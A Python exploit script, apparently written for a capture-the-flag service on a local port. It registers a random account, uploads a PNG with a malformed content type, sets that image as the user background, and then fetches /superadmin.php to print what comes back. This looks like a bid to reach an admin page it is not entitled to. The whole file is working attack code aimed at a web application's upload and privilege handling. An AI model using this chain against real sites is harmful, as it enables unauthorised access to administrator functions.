import requests
import json
import random
import string
import re

BASE_URL = "http://0.0.0.0:9010"

def getCSRFToken(html):
	m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
	if m is None:
		m = re.search(r"csrfToken\s*=\s*'([^']+)'", html)

	return m.group(1) if m else None

def genRandString(length):
	return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def main():
	session = requests.Session()
	username = genRandString(8)
	password = genRandString(16)
	print(f"{username}:{password}")

	response = session.get(url=f"{BASE_URL}/register")
	if response.status_code != 200:
		print("REG HTML ERROR")
		print(response.status_code)
		print(response.text)
		return

	reg_html = response.text
	reg_data = {
	    'csrf_token': getCSRFToken(reg_html),
	    'username': username,
	    'email': f'{username}@mail.com',
	    'password': password,
	    'confirm_password': password
	}
	response = session.post(url=f"{BASE_URL}/api/register", data=reg_data)
	if response.status_code != 200:
		print("REG ERROR")
		print(response.status_code)
		print(response.text)
		return

	file_path = '/Users/andreika47/Desktop/polirovanny-beton.png'
	with open(file_path, 'rb') as f:
		file_data = f.read()

	files = {
	    'photos[]': ('polirovanny-beton.png', open(file_path, 'rb'), '-1')
	}

	response = session.post(url=f"{BASE_URL}/api/photos/upload", files=files)
	if response.status_code != 200:
		print("UPLOAD ERROR")
		print(response.status_code)
		print(response.text)
		return

	json_resp = response.json()
	if not "success" in json_resp or not json_resp["success"]:
		print("JSON ERROR")
		print(response.status_code)
		print(response.text)
		return

	photo_id = json_resp["photos"][0]["id"]
	response = session.get(url=f"{BASE_URL}/space")
	if response.status_code != 200:
		print("SPACE HTML ERROR")
		print(response.status_code)
		print(response.text)
		return

	space_html = response.text
	back_data = {
		'csrf_token': getCSRFToken(space_html),
		'photo_id': photo_id
	}

	response = session.post(url=f"{BASE_URL}/api/user/background", data=back_data)
	if response.status_code != 200:
		print("BACK ERROR")
		print(response.status_code)
		print(response.text)
		return

	response = session.get(url=f"{BASE_URL}/superadmin.php")
	print(response.text)

if __name__ == '__main__':
	main()